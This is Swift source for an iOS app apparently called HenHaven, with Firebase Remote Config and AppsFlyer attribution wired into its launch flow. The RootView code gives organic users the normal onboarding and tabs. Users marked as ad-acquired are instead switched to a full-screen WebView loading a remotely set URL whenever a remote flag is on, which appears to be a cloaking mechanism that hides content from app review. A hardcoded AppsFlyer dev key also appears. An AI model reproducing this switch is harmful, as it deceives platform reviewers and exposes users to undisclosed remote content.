import UIKit
import FirebaseCore
import SwiftUI
import FirebaseRemoteConfig
import AppsFlyerLib

@main
class AppDelegate: UIResponder, UIApplicationDelegate {
    var window: UIWindow?
    let store = HenHavenDataManager()
    private let appsFlyerService = AppsFlyerService()
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        
        let window = UIWindow(frame: UIScreen.main.bounds)
        FirebaseApp.configure()
        
        let rootView = RootView()
            .environmentObject(store)
            .preferredColorScheme(.light)
        
        window.rootViewController = UIHostingController(rootView: rootView)
        window.makeKeyAndVisible()
        self.window = window
        
        appsFlyerService.setup(
            application: application,
            launchOptions: launchOptions,
            appsFlyerInit: .init(
                devKey: "QgHSV3vKqdKBeifRb8V5Fn",
                appleAppID: "6760432920"
            )
        ) { attribution in
            AttributionManager.shared.handle(attribution)
        }
        
//        #if DEBUG
//        processDebugDeepLinkIfNeeded()
//        #endif
        
        return true
    }
    
    func applicationDidBecomeActive(_ application: UIApplication) {
        appsFlyerService.applicationDidBecomeActive(application)
    }
    
    func application(_ application: UIApplication,
                     continue userActivity: NSUserActivity,
                     restorationHandler: @escaping ([UIUserActivityRestoring]?) -> Void) -> Bool {
        appsFlyerService.application(application, continue: userActivity, restorationHandler: restorationHandler)
        return true
    }
    
    func application(_ application: UIApplication,
                     didReceiveRemoteNotification userInfo: [AnyHashable: Any]) {
        appsFlyerService.application(application, didReceiveRemoteNotification: userInfo)
    }
    
    func application(_ app: UIApplication,
                     open url: URL,
                     options: [UIApplication.OpenURLOptionsKey: Any] = [:]) {
        appsFlyerService.application(app, open: url, options: options)
    }
    
    func application(_ application: UIApplication,
                     open url: URL,
                     sourceApplication: String?,
                     annotation: Any) {
        appsFlyerService.application(application, open: url, sourceApplication: sourceApplication, annotation: annotation)
    }
    
    func application(_ application: UIApplication,
                     didReceiveRemoteNotification userInfo: [AnyHashable: Any],
                     fetchCompletionHandler completionHandler: @escaping (UIBackgroundFetchResult) -> Void) {
        appsFlyerService.application(application, didReceiveRemoteNotification: userInfo, fetchCompletionHandler: completionHandler)
    }
}

// MARK: - Debug

//#if DEBUG
//extension AppDelegate {
//    private func processDebugDeepLinkIfNeeded() {
//        let args = CommandLine.arguments
//        
//        DispatchQueue.main.asyncAfter(deadline: .now() + 1.5) {
//            if args.contains("--test-on_1") {
//                self.triggerDebugAttribution(key: "on_1")
//            } else if args.contains("--test-key1") {
//                self.triggerDebugAttribution(key: "key1")
//            } else if args.contains("--test-key2") {
//                self.triggerDebugAttribution(key: "key2")
//            } else if args.contains("--test-key3") {
//                self.triggerDebugAttribution(key: "key3")
//            } else if args.contains("--test-organic") {
//                self.triggerDebugOrganic()
//            } else if args.contains("--reset-attribution") {
//                AttributionManager.shared.reset()
//                print("🧪 [DEBUG] Attribution cache cleared")
//            }
//        }
//    }
//    
//    private func triggerDebugAttribution(key: String) {
//        print("🧪 [DEBUG] Simulating non-organic: \(key)")
//        let params = DeepLinkParameters(
//            deepLinkValue: key,
//            afSub1: "test_type1",
//            afAdset: "test_type2",
//            deepLinkSub1: "test_referrer_\(key)",
//            pid: "test_campaign",
//            isDeferred: false
//        )
//        let info = AttributionInfo(
//            type: .appsflyer,
//            value: key,
//            attribution: ["af_status": "Non-organic"],
//            deepLinkParams: params
//        )
//        AttributionManager.shared.handle(info)
//    }
//    
//    private func triggerDebugOrganic() {
//        print("🧪 [DEBUG] Simulating organic user")
//        let info = AttributionInfo(
//            type: .appsflyer,
//            value: "",
//            attribution: ["af_status": "Organic"],
//            deepLinkParams: nil
//        )
//        AttributionManager.shared.handle(info)
//    }
//}
//#endif

// MARK: - RootView

struct RootView: View {
    @EnvironmentObject var data: HenHavenDataManager
    @ObservedObject private var attribution = AttributionManager.shared
    
    @State private var isRemoteConfigLoaded = false
    @State private var attributionTimeoutTask: Task<Void, Never>?
    
    private let attributionTimeoutSeconds: TimeInterval = 5.0

    var body: some View {
        ZStack {
            if !attribution.attributionChecked {
                ProgressView("Loading...")
                    .transition(.opacity)
                
            } else if attribution.isNonOrganic {
                if !isRemoteConfigLoaded {
                    ProgressView("Loading...")
                } else if RemoteConfigService.shared.enableWView {
                    WebViewScreen(url: RemoteConfigService.shared.url)
                } else {
                    if data.hasCompletedOnboarding {
                        HenHavenTabView()
                    } else {
                        HenHavenOnboardingView()
                    }
                }
                
            } else {
                // Органик: стандартный флоу
                if data.hasCompletedOnboarding {
                    HenHavenTabView()
                } else {
                    HenHavenOnboardingView()
                }
            }
        }
        .animation(.easeInOut(duration: 0.45), value: attribution.attributionChecked)
        .animation(.easeInOut(duration: 0.45), value: attribution.isNonOrganic)
        .animation(.easeInOut(duration: 0.45), value: isRemoteConfigLoaded)
        .onAppear {
            attribution.loadCached()
            if !attribution.attributionChecked {
                startAttributionTimeout()
            }
        }
        .onDisappear {
            attributionTimeoutTask?.cancel()
        }
        .task {
            if attribution.isNonOrganic || attribution.attributionChecked {
                await fetchRemoteConfig()
            }
        }
        .onChange(of: attribution.isNonOrganic) { isNonOrganic in
            if isNonOrganic {
                Task { await fetchRemoteConfig() }
            }
        }
    }
    
    // MARK: - Attribution Timeout
    
    private func startAttributionTimeout() {
        attributionTimeoutTask?.cancel()
        attributionTimeoutTask = Task {
            do {
                try await Task.sleep(nanoseconds: UInt64(attributionTimeoutSeconds * 1_000_000_000))
                guard !Task.isCancelled, !attribution.attributionChecked else { return }
                await MainActor.run {
                    print("⏱️ [RootView] Attribution timeout — treating as organic")
                    attribution.handle(AttributionInfo(
                        type: .custom,
                        value: "",
                        attribution: ["af_status": "Organic"],
                        deepLinkParams: nil
                    ))
                }
            } catch {}
        }
    }
    
    // MARK: - Remote Config
    
    private func fetchRemoteConfig() async {
        let remoteConfigInstance = RemoteConfig.remoteConfig()
        let settings = RemoteConfigSettings()
        settings.minimumFetchInterval = 0
        remoteConfigInstance.configSettings = settings
        remoteConfigInstance.setDefaults(fromPlist: "RemoteConfigDefaults")
        
        do {
            try await remoteConfigInstance.fetch()
            try await remoteConfigInstance.activate()
            processRemoteConfigValues(remoteConfigInstance)
        } catch {
            print("❌ [RemoteConfig] Failed: \(error.localizedDescription)")
        }
        
        isRemoteConfigLoaded = true
    }
    
    private func processRemoteConfigValues(_ remoteConfig: RemoteConfig) {
        let isEnabled = remoteConfig.configValue(forKey: "enableWView").boolValue
        let urlString = remoteConfig.configValue(forKey: "url").stringValue
        RemoteConfigService.shared.updateValues(enableWView: isEnabled, url: urlString)
    }
}
